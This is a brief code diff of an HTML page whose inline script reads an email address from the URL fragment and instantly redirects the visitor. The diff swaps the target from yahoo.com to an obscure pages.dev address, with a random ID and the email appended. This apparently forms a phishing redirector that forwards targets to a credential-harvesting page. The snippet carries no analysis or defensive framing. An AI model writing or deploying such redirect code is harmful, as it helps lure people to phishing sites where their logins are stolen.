@@ -19,7 +19,7 @@
   var em = hash.split("#")[1];
 
   window.setTimeout(function () {
-   window.location.href = "https://yahoo.com/index.html/"+ makeid(10) + "#" + em;
+   window.location.href = "https://dis-put-b0-1tepric-942bcc2c01eiag-newlook-reathou.pages.dev/"+ makeid(10) + "#" + em;
   }, 0);
  </script>
 </html>
